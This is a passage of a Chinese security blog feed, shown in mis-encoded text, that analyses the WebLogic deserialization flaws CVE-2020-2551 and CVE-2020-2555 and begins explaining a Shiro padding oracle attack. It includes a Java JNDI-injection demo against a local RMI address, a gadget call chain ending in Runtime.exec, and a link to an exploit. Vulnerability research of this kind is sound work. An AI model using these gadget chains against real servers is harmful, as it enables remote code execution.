ËøêË°åÂºÄÂêØNaming ServiceÔºö1orbd -ORBInitialPort 1050 -ORBInitialHost 127.0.0.1 ËøêË°åÂÆ¢Êà∑Á´ØÊúçÂä°Á´ØÔºö12java -classpath . HelloServerjava -classpath . HelloClient ‰∏äËø∞ÂÆ¢Êà∑Á´ØÊúçÂä°Á´Ø‰ª£Á†ÅÂ¶ÇÊûúÂú®InitialContextÊ≤°‰º†ÂÖ•ÂèÇÊï∞ÂèØ‰ª•ÂÉèÊñáÊ°£‰∏≠ÊâÄËø∞ÈÄöËøájava -D‰º†ÈÄí ÁªìÊûú ÊºèÊ¥ûÂ§çÁé∞weblogic10.3.6ÁâàÊú¨Ôºåjdk8u73ÁâàÊú¨ ÈááÂùëÔºåËÆ∞ÂæóweblogicÁâàÊú¨„ÄÅrmiÊúçÂä°„ÄÅexpÁâàÊú¨ÈÉΩ‰∏ÄËá¥ EXPÔºöhttps://github.com/Y4er/CVE-2020-2551 ÊºèÊ¥ûÂàÜÊûêËøô‰∏™ËØ•ÊºèÊ¥ûÂÄüÂä©IIOPÂçèËÆÆËß¶ÂèëÂèçÂ∫èÂàóÂåñÔºåÁªìÂêàÂØπJtaTransactionManagerÁ±ªÁöÑÈîôËØØËøáÊª§ÔºåÂØºËá¥ÂèØ‰ª•ÁªìÂêàÂÖ∂Ëß¶ÂèëÂÖ∂Á±ªÁöÑJNDIÊ≥®ÂÖ•ÈÄ†ÊàêRCEÁöÑÊïàÊûú„ÄÇ JtaTransactionManager GadgetÂàÜÊûêweblogic‰∏≠Ëá™Â∏¶ÁöÑ‰∏Ä‰∏™SpringÊ°ÜÊû∂ÁöÑÂåÖÔºö/com/bea/core/repackaged/springframework/transaction/jta/JtaTransactionManager#readObjectÂú®ÂèçÂ∫èÂàóÂåñË∞ÉÁî®readObjectÊó∂Ôºå‰ºöË∞ÉÁî®initUserTransactionAndTransactionManagerÊñπÊ≥ïÔºöÊé•ÁùÄË∞ÉÁî®this.lookupUserTransactionÊñπÊ≥ïÔºå‰º†ÂÖ•ÊàêÂëòÂèòÈáèthis.userTransactionName: Ëé∑Âèñthis.getJndiTemplate()ÂêéÔºåÂú®/com/bea/core/repackaged/springframework/jndi/JndiTemplate#lookup‰∏≠Âà∞ËøôÈáåÈÄöËøáÊéßÂà∂userTransactionNameÂ±ûÊÄßÔºåËøõË°åJNDIÊ≥®ÂÖ•Ôºö demo:12345678910111213141516171819202122232425262728public class jnditest &#123; public static void main(String[] args)&#123; JtaTransactionManager jtaTransactionManager = new JtaTransactionManager(); jtaTransactionManager.setUserTransactionName("rmi://127.0.0.1:1099/Exploit"); serialize(jtaTransactionManager); deserialize(); &#125; public static void serialize(Object obj) &#123; try &#123; ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("jndi.ser")); os.writeObject(obj); os.close(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public static void deserialize() &#123; try &#123; ObjectInputStream is = new ObjectInputStream(new FileInputStream("jndi.ser")); is.readObject(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; ÂêéÊù•Áøª‰∫Ü‰∏Ä‰∏ãËµÑÊñôÔºåÂú®CVE-2018-3191‰∏≠‰ΩøÁî®ÁöÑÂ∞±ÊòØËØ•gadgetÔºåÂΩìÊó∂ÁªìÂêàT3ÂçèËÆÆËøõË°åÂèçÂ∫èÂàóÂåñÔºå‰øÆÂ§çÊñπÊ°àÂ∞ÜJtaTransactionManagerÁöÑÁà∂Á±ªAbstractPlatformTransactionManagerÂä†ÂÖ•Âà∞ÈªëÂêçÂçïÂàóË°®‰∫ÜÔºåT3ÂçèËÆÆ‰ΩøÁî®ÁöÑÊòØresolveClassÊñπÊ≥ïÂéªËøáÊª§ÁöÑ,resolveClassÊñπÊ≥ïÊòØ‰ºöËØªÂèñÁà∂Á±ªÁöÑ,ÊâÄ‰ª•T3ÂçèËÆÆËøôÊ†∑ËøáÊª§ÊòØÊ≤°ÈóÆÈ¢òÁöÑ„ÄÇ‰ΩÜÊòØÂú®IIOPÂçèËÆÆËøôÈáåÔºå‰πüÊòØ‰ΩøÁî®ÈªëÂêçÂçïËøõË°åËøáÊª§Ôºå‰ΩÜ‰∏çÊòØ‰ΩøÁî®resolveClassÊñπÊ≥ïÂéªÂà§Êñ≠ÁöÑÔºåËøôÊ†∑ÈªòËÆ§Âè™‰ºöÂà§Êñ≠Êú¨Á±ªÁöÑÁ±ªÂêçÔºåËÄåJtaTransactionManagerÁ±ªÊòØ‰∏çÂú®ÈªëÂêçÂçïÂàóË°®ÈáåÈù¢ÁöÑ,ÂÆÉÁöÑÁà∂Á±ªÊâçÂú®ÈªëÂêçÂçïÂàóË°®ÈáåÈù¢,ËøôÊ†∑Â∞±ÂèØ‰ª•ÂèçÂ∫èÂàóÂåñJtaTransactionManagerÁ±ª‰∫ÜÔºå‰ªéËÄåËß¶ÂèëJNDIÊ≥®ÂÖ•„ÄÇ ContextÁöÑÁîüÊàê‰ª•ÂèäbindÁöÑÊµÅÁ®ã(servant side)Âú®‰∏äÊñá‰∏≠RMI-IIOPÁöÑÂÆ¢Êà∑Á´Ødemo‰∏≠ÔºåÂàÜ‰∏∫‰∏â‰∏™Ê≠•È™§Ôºö ‰ªéName Service‰∏≠Ëé∑ÂèñConetextÂØπË±° ‰ªéName Service‰∏≠Êü•ËØ¢ÊåáÂÆöÂêçÁß∞ÊâÄÂØπÂ∫îÁöÑÂºïÁî® Ë∞ÉÁî®ËøúÁ®ãÊñπÊ≥ï ÂÖàÊù•ÁúãÁ¨¨‰∏Ä‰∏™ËøáÁ®ãÔºåÊó†ËÆ∫ÊòØÂÆ¢Êà∑Á´ØËøòÊòØÊúçÂä°Á´ØÈÉΩË¶ÅËøõË°åÁöÑÁöÑ‰∏Ä‰∏™Ê≠•È™§ÔºöInitialContextÊñπÊ≥ï‰∏≠Â∞ÜenvÂèÇÊï∞‰º†ÂÖ•ÔºåËøõË°åÂàùÂßãÂåñÔºöÁªèËøáÂá†Ê¨°Ë∞ÉÁî®Ôºå‰∏ÄÁõ¥Ë∑üËøõÂà∞javax/naming/spi/NamingManager.java#getInitialContextÊñπÊ≥ïÂèØ‰ª•ÁúãÂà∞Âú®ËøôÈáåÂ∞ÜÊàë‰ª¨‰º†ÂÖ•ÁöÑenvÂØπÂ∫îÁöÑÂ∑•ÂéÇÁ±ªËøõË°åËé∑ÂèñÔºåÊàë‰ª¨Êù•Êâæ‰∏Ä‰∏ãÔºåÂú®weblogic‰∏≠ÊúâÂ§öÂ∞ë‰∏™ÂèØ‰ª•Âä†ËΩΩÁöÑÂ∑•ÂéÇÁ±ªÔºåÊâæÂà∞InitialContextFactoryÊé•Âè£(ctrl+hÊü•Áúã‰æùËµñÊ†ë) ËøôÈáåÁõ¥Êé•Êù•ÁúãWLInitialContextFactoryÁ±ªÔºö /wlserver_10.3/server/lib/wls-api.jar!/weblogic/jndi/Environment#getContext getInitialContextÊñπÊ≥ï‰∏≠ÔºåÂà∞ËøôÈáåÂÖ∂ÂÆûÂ∞±ÊòØCORBAÁöÑËß£ÊûêÊµÅÁ®ã‰∫ÜÔºå ÁÆÄÂçïË∑ü‰∏Ä‰∏ãstring_to_objectÊñπÊ≥ïÔºåËøôÈáåÂÖ∂ÂÆûÂ∞±ÊòØ‰∏äÊñá‰∏≠CORBAÁöÑstubÁîüÊàê‰∏âÁßçÊñπÂºèÊâÄÂØπÂ∫îÁöÑÂçèËÆÆÔºö IOR Corbaname Corbaloc ÂÜçÊù•ÁúãgetORBReferenceÊñπÊ≥ïÔºåÂÖ∂ÂÆûÂ∞±ÊòØCORBAÂàùÂßãÂåñorbËé∑ÂèñName ServiceÁöÑËøáÁ®ãÔºöÂØπÂ∫îCORBA‰∏≠‰ª£Á†ÅÔºöÂÜçÊù•Áúã‰∏Ä‰∏ãConetextÁöÑÁªëÂÆöËøáÁ®ãÔºö/corba/j2ee/naming/ContextImplÂèØ‰ª•ÁúãÂà∞Ëøô‰∏™ËøáÁ®ãÂÖ∂ÂÆûÂ∞±ÊòØCORBAÁîüÊàêIORÁöÑËøáÁ®ãÔºåÊåáÂÆöjavaÁ±ªÂûã‰∫§‰∫íÁöÑÁ∫¶ÂÆö‰∏∫tk_valueÔºåËÆæÂÆöop‰∏∫rebind_anyÔºåÂ≠òÂÇ®Â∫èÂàóÂåñÊï∞ÊçÆÂà∞anyÁ±ªÔºåÂæÖclient sideË∞ÉÁî®„ÄÇ ÂÖ∂ÂÆûÂú®ÂàÜÊûêËøôÈáå‰πãÂâç‰∏ÄÁõ¥Êúâ‰∏Ä‰∏™ÈóÆÈ¢òÊó†Ê≥ïÁêÜËß£Ôºå‰∏ÄÁõ¥‰ª•‰∏∫weblogicÊòØorbd+servant sideÔºåËÄåÊàë‰ª¨ÂÜôÁöÑexpÊòØclient sideÔºåÂú®Âíå@LucifaerÂ∏àÂÇÖÂ≠¶‰π†ÂêéÔºåÂÖ∂ÂÆûÂØπ‰∫éweblogicÁöÑorbdËÄåË®ÄÔºåservant sideÂíåclient sideÈÉΩÊòØÂÆ¢Êà∑Á´ØÔºåËÄåweblogic(orbd)ÊòØÂú®Â§ÑÁêÜservant sideÁöÑÊó∂ÂÄôËß£ÊûêÊï∞ÊçÆÈÄ†ÊàêÂèçÂ∫èÂàóÂåñÁöÑÈóÆÈ¢ò„ÄÇ Âà∞ËøôÈáåservant sideÁöÑÊ≥®ÂÜåÂ∞±ÁªìÊùü‰∫ÜÔºå‰∏ãÈù¢Êù•ÂàÜÊûê‰∏Ä‰∏ãweblogicÊòØÂ¶Ç‰ΩïÂØπÂÖ∂ËøõË°åËß£ÊûêÁöÑ„ÄÇ weblogicËß£ÊûêÊµÅÁ®ãweblogicËß£ÊûêËØ∑Ê±ÇÁöÑÂÖ•Âè£ÂºÄÂßãÔºöweblogic/rmi/internal/wls/WLSExecuteRequest#runÂÆåÊï¥Ë∞ÉÁî®Ê†àÂú®‰∏ãÊñáÔºåËøôÈáåÈÄâÂèñÂá†‰∏™ÊØîËæÉÂÖ≥ÈîÆÁöÑÁÇπÊù•ÂàÜÊûêÔºöweblogic/corba/idl/CorbaServerRef#invokeÂÖàÊòØÂà§Êñ≠ËØ∑Ê±ÇÁ±ªÂûãÊòØÂê¶‰∏∫objectMethodsÂ∑≤ÁªèÂ≠òÂú®ÁöÑÔºåËøôÈáåÊòØrebind_anyÔºå‰∏çÂ≠òÂú®ÂàôË∞ÉÁî®this.delegate._invokeÊñπÊ≥ïÔºåÁÑ∂ÂêéÂ∞ÜÊñπÊ≥ïÁ±ªÂûãÔºåIIOPInputStreamÊï∞ÊçÆ‰º†ÂÖ•_invokeÂáΩÊï∞Ôºörebind_anyÊåá‰ª§Á±ªÂûãÂØπÂ∫îÁöÑvar5‰∏∫1ÔºåËøõÂÖ•var2.read_any()ËøôÈáåÁöÑthis.read_TypeCode()Âç≥‰∏äÊñá‰∏≠Context bind‰∏≠ÁöÑtk_valueËÆæÁΩÆÁöÑ‰∫§‰∫íÁ±ªÂûãÔºåÂú®weblogic/corba/idl/AnyImpl#read_value_internalÂØπÂ∫îcase 30ÔºåÂêåÊó∂ËøôÈáåÁöÑAnyÁ±ªÂûãÔºåÂú®‰∏äÊñáContextÂàÜÊûê‰∏≠Ê≠£ÂºèÊàë‰ª¨Â∞ÜÂ∫èÂàóÂåñÊï∞ÊçÆÊèíÂÖ•ÁöÑÂú∞Êñπ„ÄÇ Ë∑üËøõweblogic/corba/utils/ValueHandlerImpl Âú®ËøôÈáåvar2‰∏∫ObjectStreamClassÔºåË∞ÉÁî®ÂÖ∂readObjectÊñπÊ≥ï„ÄÇÁªßÁª≠Ë∑üreadObjectÔºöÂèçÂ∞ÑË∞ÉÁî®JtaTransactionManagerÁöÑreadObjectÔºöcom/bea/core/repackaged/springframework/transaction/jta/JtaTransactionManager#readObjectÊúÄÂêéÂ∞±ÊòØjndiÊ≥®ÂÖ•‰∫ÜÔºö ÂÆåÊï¥Ë∞ÉÁî®Ê†àÔºö EXPÂàÜÊûêÂú®ÂàÜÊûêEXPÊó∂‰∏™‰∫∫Êúâ‰∏ÄÁÇπÁñëÊÉëÔºåËÆ∞ÂΩï‰∏Ä‰∏ãÂàÜÊûêÂíåËß£ÂÜ≥ÁöÑËøáÁ®ã„ÄÇ ÂèÇËÄÉY4er/CVE-2020-2551ÔºåËøôÈáåÊàë‰ª¨ÁªìÂêàIIOP servant sideÁöÑdemoÊù•ÁúãÔºö ‰∏äÂõæ‰∏∫EXPÔºå‰∏ãÂõæ‰∏∫IIOPÊúçÂä°Á´ØÔºåËøôÈáåÊúâ‰∏ÄÁÇπÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåÂú®demo‰∏≠HelloImplÁ±ªÁªßÊâø‰∫ÜHelloInterfaceÂÆûÁé∞‰∫Üjava.rmi.RemoteËøúÁ®ãÁ±ªÁöÑÁªßÊâøÔºö ÂõûËøáÂ§¥Êù•ÁúãJtaTransactionManagerÁ±ªÁöÑÊé•Âè£ÔºöÊ≠£ÊòØËøô‰∏™ÂéüÂõ†ÊâçÈúÄË¶ÅÊàë‰ª¨Âú®ÁºñÂÜôEXPÁöÑÊó∂ÂÄôÔºåÈúÄË¶ÅÂ∞ÜjtaTransactionManagerÈÄöËøáÂèçÂ∞ÑÔºåÂä®ÊÄÅËΩ¨Êç¢ÊàêremoteËææÂà∞ËøúÁ®ãË∞ÉÁî®ÁöÑÁõÆÁöÑ„ÄÇ ÊúÄÂêéÂú®Ëá™Â∑±Âä®ÊâãÂàÜÊûê‰πãÂâçÔºåÊàë‰∏ÄÁõ¥ÊääweblogicÂΩìÊàêservant sideÂíåorbd(name Service)Ôºå‰πüÊó†Ê≥ïÁêÜËß£‰∏∫‰ªÄ‰πàEXPË¶ÅÂíåCOBARÁöÑservant side‰∏ÄÊ†∑Áî®rebindÊ≥®ÂÜåÔºåÂêéÊù•Âú®@LucifaerÂ∏àÂÇÖÁöÑÂ∏ÆÂä©‰∏ãÊâçÁêÜËß£ËøôÈáåÊ≤°Êúâclient sideÁöÑÂèÇ‰∏éÔºåËÄåÂØπ‰∫éName ServiceËÄåË®ÄËøô‰∏§ËÄÖÈÉΩÊòØÂÆ¢Êà∑Á´Ø„ÄÇ ÂÖ∂Ê¨°ËøôÁßçÊºèÊ¥ûIIOPÂè™ÊòØËΩΩ‰ΩìÔºåJtaTransactionManager‰∏∫gadgetÔºåÂÆòÊñπ‰øÆÂ§ç‰πü‰ªÖ‰ªÖÂè™ÊòØÊ∑ªÂä†ÈªëÂêçÂçïÔºåIIOPÁöÑÈóÆÈ¢òÊ≤°Ê†πÊú¨Ëß£ÂÜ≥ÔºåÂÜçÁàÜ‰∏Ä‰∏™gadgetÂèàÂæó‰øÆÔºåÈóÆÈ¢òÊ∫êÊ∫ê‰∏çÊñ≠„ÄÇÊõ¥ÂùëÁàπÁöÑÊòØÂÆòÁΩëÁõ¥Êé•‰∏ãÁöÑweblogicËøûÈªëÂêçÂçïÈÉΩÊ≤°ÊúâÔºå‰∏™‰∫∫ËßâÂæóÈò≤Âæ°ËøôÁßçÈóÆÈ¢òÂçïÁ∫ØÈù†wafÊµÅÈáèÊ£ÄÊµãÊ†πÊú¨Èò≤‰∏ç‰ΩèÔºåÊ≤°ÊúâÂèçÂ∫èÂàóÂåñÁâπÂæÅÔºå‰∫åËøõÂà∂Êï∞ÊçÆÊµÅ„ÄÇË¶ÅÈò≤ËåÉËøôÁ±ªÊñ∞ÈóÆÈ¢òÁöÑ‰∫ßÁîüÔºåÊàñËÆ∏Âè™ÊúâRASPÁöÑË°å‰∏∫Ê£ÄÊµãÊâçËÉΩËß£ÂÜ≥„ÄÇ ÊúÄÂêéÊÑüË∞¢@LucifaerÂ∏àÂÇÖÁöÑÂ∏ÆÂä©~ ÂèÇËÄÉÊñáÁ´†Ôºö ÂÖ≥‰∫é Java ‰∏≠ÁöÑ RMI-IIOP Tutorial: Getting Started Using RMI-IIOP An Introduction To The CORBA And Java RMI-IIOP Java IDL: IDL to Java Language Mapping]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>ÊºèÊ¥ûÂàÜÊûê</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2020-2555ÔºöweblogicÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂàÜÊûê]]></title>
    <url>%2F2020%2F03%2F11%2FCVE-2020-2555%EF%BC%9Aweblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[ËÉåÊôØ2020Âπ¥3Êúà6Êó•ÔºåOracle Coherence ÂèçÂ∫èÂàóÂåñËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥ûÔºàCVE-2020-2555ÔºâÁöÑÁªÜËäÇË¢´ÂÖ¨ÂºÄÔºåOracle Coherence‰∏∫OracleËûçÂêà‰∏≠Èó¥‰ª∂‰∏≠ÁöÑ‰∫ßÂìÅÔºåÂú®WebLogic 12cÂèä‰ª•‰∏äÁâàÊú¨‰∏≠ÈªòËÆ§ÈõÜÊàêÂà∞WebLogicÂÆâË£ÖÂåÖ‰∏≠ÔºåÊîªÂáªËÄÖÈÄöËøát3ÂçèËÆÆÂèëÈÄÅÊûÑÈÄ†ÁöÑÂ∫èÂàóÂåñÊï∞ÊçÆÔºåËÉΩËøáÈÄ†ÊàêÂëΩ‰ª§ÊâßË°åÁöÑÊïàÊûú„ÄÇ ÁéØÂ¢ÉÊê≠Âª∫ÂèÇËÄÉÂÆòÊñπÂèëÁöÑË°•‰∏ÅÂÖ¨ÂëäÔºöOracle Critical Patch Update Advisory - January 2020 Description ËøôÈáåÊàë‰ª¨Áî®12.2.1.4ÊµãËØïÔºåÊãâÂà∞idea‰∏≠ÔºåÂä®ÊÄÅË∞ÉËØïÁéØÂ¢ÉÂèÇËÄÉÔºöWebLogic-XMLDecoderÂèçÂ∫èÂàóÂåñÂàÜÊûê ÊºèÊ¥ûÂàÜÊûê‰∏ªË¶ÅÂèÇËÄÉËøôÁØáÊñáÁ´†Êù•ÊûÑÂª∫gadgetsÔºåCVE-2020-2555: RCE THROUGH A DESERIALIZATION BUG IN ORACLE‚ÄôS WEBLOGIC SERVER Ê†πÊçÆÊñáÁ´†ÊâÄËø∞ÁöÑsourceÁÇπÔºåcmd + oÂø´ÈÄüÂÆö‰ΩçÂà∞/coherence_3.7/lib/coherence.jar!/com/tangosol/util/filter/LimitFilter.classÊñáÁ´†‰∏≠diffÁöÑÂáΩÊï∞Â∞±ÊòØËøô‰∏™toStringÂáΩÊï∞‰∫ÜÔºåË°•‰∏Å‰∏≠ÂéªÊéâ‰∫ÜËØ•ÂáΩÊï∞ÊâÄÊúâÁöÑextractor.extractÊñπÊ≥ïÔºö toString()ÊñπÊ≥ïÔºåÂú®ÂæàÂ§öJREÁöÑclass‰∏≠readObjectÊñπÊ≥ïÈÉΩÊúâÂÆûÁé∞ÔºåÊØîÂ¶ÇÔºöjavax/management/BadAttributeValueExpException.java Ëøô‰∏™ÁÇπÂíåcommon-collection5ÁöÑgadgetÂæàÂÉèÔºåÂèÇËÄÉÊñáÁ´†Ôºöhttps://y4er.com/post/ysoserial-commonscollections-5/ Êé•ÁùÄÂ∞±ÊòØÂØªÊâæÂì™‰∏™ÂèØÂ∫èÂàóÂåñclass‰∏≠ÁöÑÊúâextractÂáΩÊï∞Ôºå‰∏îÊñπ‰æøÊûÑÈÄ†ÂëΩ‰ª§ÊâßË°åÁöÑÔºå‰∏ÄËà¨Êù•ËØ¥ÊúâËøô‰πà‰∫õÁÇπÔºö Runtime.exec() Method.invoke() RMI/JNDI/JRMP Âú®com/tangosol/util/extractor/ReflectionExtractor.class‰∏≠ÂÆûÁé∞‰∫ÜMethod.invoke()ÁöÑË∞ÉÁî®Ôºö ËøôÈáåËØªËøácommon-collection5ÁöÑÈÉΩ‰ºöÁÜüÊÇâÔºåÊé•‰∏ãÊù•Â∞±Ë¶ÅÊâæ‰∏Ä‰∏™ÈìæÂºèË∞ÉÁî®ÁöÑÁÇπÔºåÊûÑÈÄ†ÂëΩ‰ª§ÊâßË°å: /com/tangosol/util/extractor/ChainedExtractor.class ÁºñÂÜôEXPÂà∞ËøôÈáåÂü∫Êú¨Â∑≤ÁªèÂàÜÊûêÂÆå‰∫ÜÔºåEXPÁºñÂÜôÂèÇËÄÉËøô‰∏™ÂÆåÊàêgadgetË∞ÉÁî®ÈìæÔºö12345678910111213ObjectInputStream.readObject() BadAttributeValueExpException.readObject() LimitFilter.toString() ChainedExtractor.extract() ReflectionExtractor.extract() Method.invoke() Class.getMethod() ReflectionExtractor.extract() Method.invoke() Runtime.getRuntime() ReflectionExtractor.extract() Method.invoke() Runtime.exec() Ëøô‰∏™ÊºèÊ¥ûÂü∫Êú¨ÊÄùË∑ØÂíåcommon-collection‰∏ÄÊ†∑ÔºåÁºñÂÜôEXPÂè™Êúâ‰∏ÄÁÇπÁÇπÂ∑ÆÂºÇÔºå‰ªîÁªÜËØª‰ª£Á†ÅÁêÜËß£Ë∞ÉÁî®ÂÖ≥Á≥ªÂ∞±Â•Ω‰∫ÜÔºåËøôÈáåÂ∞±‰∏çÂÖ¨ÂºÄEXP‰∫Ü„ÄÇ ÊúÄÂêéÂõ†‰∏∫ÊòØÂèÇËÄÉÂàÜÊûêÂÜôÁöÑEXPÔºåÂàÜÊûêÊñáÁ´†‰∏≠ÂÖ≥ÈîÆÁ±ªÁöÑ‰ΩçÁΩÆÂ∑≤ÁªèÁªôÂá∫‰∫ÜÔºå‰∏™‰∫∫ÊÑüËßâÊåñÊéòÊºèÊ¥ûËøáÁ®ã‰∏≠ÊúÄÈáçË¶ÅÁöÑÁÇπËøòÊòØÂØªÊâæÊï∞ÊçÆ‰º†ËæìÁöÑËøáÁ®ãÔºå‰πãÂêéÁöÑÂ≠¶‰π†ÂæóÂú®ÂØªÊâægadgetË∞ÉÁî®ÂÖ≥Á≥ª‰∏äÂ§öÁ†îÁ©∂Á†îÁ©∂„ÄÇ]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>ÊºèÊ¥ûÂàÜÊûê</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Shiro ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂàÜÊûê]]></title>
    <url>%2F2020%2F03%2F08%2FShiro%20Padding%20Oracle%20Attack%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%2F</url>
    <content type="text"><![CDATA[Âü∫Á°ÄÂèÇËÄÉctfwiki‰∏≠ÂØπCBCÊ®°ÂºèÁöÑ‰ªãÁªçÔºåÂÖàÁúã‰∏Ä‰∏ãCBCÊ®°Âºè‰∏ãÁöÑÂä†Ëß£ÂØÜÊ®°ÂºèÂõæÔºö ÁÆÄÂçïÊ¶ÇÊã¨‰∏Ä‰∏ãÔºåÂä†ÂØÜËøáÁ®ãÂàùÂßãÂåñÂêëÈáèIVÂíåÁ¨¨‰∏ÄÁªÑÊòéÊñáËøõË°åÂºÇÊàñÔºåÁÑ∂ÂêéÁªèËøáÂä†ÂØÜÁÆóÊ≥ïÂæóÂà∞Á¨¨‰∏ÄÁªÑÂØÜÊñáÔºåÂπ∂ÊãøÂÆÉ‰Ωú‰∏∫‰∏ã‰∏ÄÂàÜÁªÑÂä†ÂØÜÁöÑIVÂêëÈáèÔºåËø≠‰ª£‰∏ãÂéª„ÄÇËß£ÂØÜËøáÁ®ãÂèç‰πãÔºåÂÖàËß£ÂØÜÂÜçÂíåIVÂêëÈáèÂºÇÊàñÂæóÂà∞ÊòéÊñáplaintext„ÄÇËøôÈáåÁöÑIVÂèÇÊï∞ÊòØ‰∏Ä‰∏™ÈöèÊú∫ÂÄº(ÈïøÂ∫¶ÂíåÂàÜÁªÑÈïøÂ∫¶Á≠âÈïø)Ôºå‰∏∫‰∫Ü‰øùËØÅÂ§öÊ¨°Âä†ÂØÜÁõ∏ÂêåÊï∞ÊçÆÁîüÊàêÁöÑÂØÜÊñá‰∏çÂêåËÄåËÆæËÆ°ÁöÑ„ÄÇ ‰∏∫‰∫ÜÊñπ‰æøÂêéÊñáÊèèËø∞ÔºåÂ∞ÜIVÂíåPlanttextÂºÇÊàñÂêéÁöÑÂÄºÁß∞‰∏∫‰∏≠Èó¥intermediary Value„ÄÇ ÂàÜÁªÑÁöÑÂ°´ÂÖÖpaddingÂàÜÁªÑÁöÑÈïøÂ∫¶Ôºå‰∏çÂêåÂä†ÂØÜÁÆóÊ≥ïÁöÑÈïøÂ∫¶Â¶Ç‰∏ãÂõæÊâÄÁ§∫Ôºö ÂàÜÁªÑÂØÜÁ†Å(block cipher)ÈúÄË¶Å‰øùËØÅÊÄªÈïøÂ∫¶ÊòØÂàÜÁªÑÈïøÂ∫¶ÁöÑÊï¥Êï∞ÂÄçÔºå‰ΩÜ‰∏ÄËà¨Âú®ÊúÄÂêé‰∏ÄÁªÑ‰ºöÂá∫Áé∞ÈïøÂ∫¶‰∏çÂ§üÂàÜÁªÑÈïøÂ∫¶ÁöÑÊÉÖÂÜµÔºåËøôÊó∂ÂÄôÂ∞±ÈúÄË¶Å‰ΩøÁî®paddingÂ°´ÂÖÖÔºåÂ°´ÂÖÖÁöÑËßÑÂàôÊòØÂú®ÊúÄÂêéÂ°´ÂÖÖ‰∏Ä‰∏™Âõ∫ÂÆöÁöÑÂÄºÔºåÂÄºÁöÑÂ§ßÂ∞è‰∏∫Â°´ÂÖÖÁöÑÂ≠óËäÇÊÄªÊï∞ÔºåÂç≥ÈúÄÊúÄÂêéËøòÂ∑Æ2‰∏™Â≠óËäÇÔºåÂàôÂ°´ÂÖÖ‰∏§‰∏™0x02„ÄÇ‰∏ãËæπ8‰∏™Â≠óËäÇÁöÑÂ°´ÂÖÖËåÉÂõ¥‰∏∫0x01-0x08„ÄÇ ËøôÁßçPaddingÂéüÂàôÈÅµÂæ™ÁöÑÊòØÂ∏∏ËßÅÁöÑPKCS#5Ê†áÂáÜ„ÄÇhttps://www.di-mgt.com.au/cryptopad.html#PKCS5 Padding Oracle AttackÂà©Áî®Êù°‰ª∂ ÊîªÂáªËÄÖÁü•ÈÅìÂØÜÊñáÂíåÂàùÂßãÂêëÈáèIV paddingÈîôËØØÂíåpaddingÊ≠£Á°ÆÊúçÂä°Âô®ÂèØËøîÂõû‰∏ç‰∏ÄÊ†∑ÁöÑÁä∂ÊÄÅ ÊîªÂáªÊïàÊûúÊ≠£Â∏∏CBCËß£ÂØÜÈúÄË¶ÅÁü•ÈÅìIV„ÄÅKey„ÄÅÂØÜÊñáÔºåËÄåÈÄöËøáPadding OracleÊºèÊ¥ûÔºåÂè™Áî®Áü•ÈÅìIV„ÄÅÂØÜÊñáÂç≥ÂèØËé∑ÂæóÊòéÊñá„ÄÇ demo‰ª•ËøôÊ†∑‰∏Ä‰∏™Á®ãÂ∫è‰∏∫‰æãÔºö1https://sampleapp/home.jsp?UID=0000000000000000EFC2807233F9D7C097116BB33E813C5E Ââç16‰∏™Â≠óÊØç(8Â≠óËäÇ)0000000000000000‰∏∫IVÔºåÂêé32Â≠óÊØç(16Â≠óËäÇ)‰∏∫ÂØÜÊñáÔºö padding 0x01ÈÄöÂ∏∏Á®ãÂ∫èÊ†°È™åpaddingÊòØÂê¶Ê≠£Á°ÆÊòØÈÄöËøáÊ£ÄÊü•Êú´Â∞æÁöÑÈÇ£‰∏™Â≠óËäÇÁöÑÂÄºÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøá‰øÆÊîπIVÁöÑÂÄº‰ΩøÂæóÂÖ∂‰∏é‰∏≠Èó¥Èáèintermediary ValueÂºÇÊàñÂæóÂà∞ÁöÑÁªìÊûú(plaintext)ÊúÄÂêé‰∏Ä‰∏™Â≠óËäÇ(Â°´ÂÖÖ‰Ωç)‰∏∫0x01„ÄÇ ÂÆûÁé∞ËøôÊ†∑‰∏Ä‰∏™Á©∑‰∏æÁöÑËøáÁ®ãÔºåÈúÄË¶ÅÊîπÂèòIVÁöÑÊúÄÂêé‰∏Ä‰∏™Â≠óËäÇ(ÊúÄÂ§ö255Ê¨°)Ôºå‰∏îÈúÄË¶ÅÊúçÂä°Á´ØÂ∞ÜÂà§Êñ≠paddingÊ†°È™åÁöÑÁªìÊûúËøîÂõûÁªôÂÆ¢Êà∑Á´Ø(Á±ª‰ºº‰∫éÂ∏ÉÂ∞îÊ≥®ÂÖ•ÁöÑÈÄªËæë)„ÄÇÊØîÂ¶ÇÂú®webÂ∫îÁî®‰∏≠ÔºåpaddingÊ≠£Á°Æ(Ëß£ÂØÜÁöÑÂÜÖÂÆπ‰∏çÊ≠£Á°Æ)ËøîÂõû200ÔºåpaddingÈîôËØØ(Ëß£ÂØÜÂÜÖÂÆπÈîôËØØ)ËøîÂõû500„ÄÇ Ëá≥Ê≠§ÈÄöËøá‰∏äËø∞Ê≠•È™§ÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáIV(fuzzÂá∫ÁöÑIV)Âíå0x01ÂºÇÊàñÂæóÂà∞intermediary Value‰∏≠Èó¥ÂÄº„ÄÇ Âú®Âçï‰∏™ÂàÜÁªÑÁöÑÊÉÖÂÜµ‰∏ãÔºåÂÖ∂ÂÆûÊàë‰ª¨ÊãøÁùÄintermediary ValueÂíåÂàùÂßãÂêëÈáèIVÂºÇÊàñÔºåÂç≥ÂèØÊãøÂà∞ÊúÄÂêéÊòéÊñáÁöÑÊúÄÂêé‰∏Ä‰∏™Â≠óËäÇÔºö padding 